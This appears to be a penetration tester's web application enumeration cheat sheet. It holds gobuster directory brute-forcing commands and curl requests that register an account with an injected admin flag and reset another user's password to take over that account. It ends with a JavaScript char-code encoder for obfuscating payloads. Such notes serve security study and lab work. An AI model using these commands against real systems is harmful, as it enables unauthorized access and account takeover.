# WebApps enum

## Sitemaps

```
http://ip/robots.txt
http://ip/sitemap.xml
```

## Gobuster

```
gobuster dir -u http://ip:port -w /usr/share/wordlists/dirb/big.txt -p pattern
curl -i ip:port/gobuster_dir/gobuster_version # with Headers
gobuster dir -u http://ip:port/gdir/gver/guser/ -w /usr/share/wordlists/dirb/small.txt
curl -i http://ip:port/gdir/gver/guser/gword
curl -i http://ip:port/gdir/gver/guser/gword2
curl -d '{"password":"somepass","username":"someuser"}' -H 'Content-Type: application/json' http://ip:port/gdir/gver/login
curl -d '{"password":"somepass","username":"someuser"}' -H 'Content-Type: application/json' http://ip:port/gdir/gver/register
curl -d '{"password":"somepass","username":"someuser","email":"some@email.com","admin":"True"}' -H 'Content-Type: application/json' http://ip:port/gdir/gver/guser/register
curl -d '{"password":"somepass","username":"someuser"}' -H 'Content-Type: application/json' http://ip:port/gdir/gver/login # get auth_token
curl  \ # default is POST
  'http://ip:port/gdir/gver/guser/gword2' \
  -H 'Content-Type: application/json' 
  -H 'Authorization: OAuth my_auth_token' \
  -d '{"password": "new_pass"}'
curl -X 'PUT' \ # or PATCH
  'http://ip:port/gdir/gver/guser/gword2' \
  -H 'Content-Type: application/json' 
  -H 'Authorization: OAuth my_auth_token' \
  -d '{"password": "new_pass"}'
curl -d '{"password":"new_pass","username":"guser"}' -H 'Content-Type: application/json' http://ip:port/gdir/gver/login 

```

## Javascript (console: ^C+^S+k)

```
function myFunc(a,b){
  return a+b
  }
let c = myFunc(n1,n2)

function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```


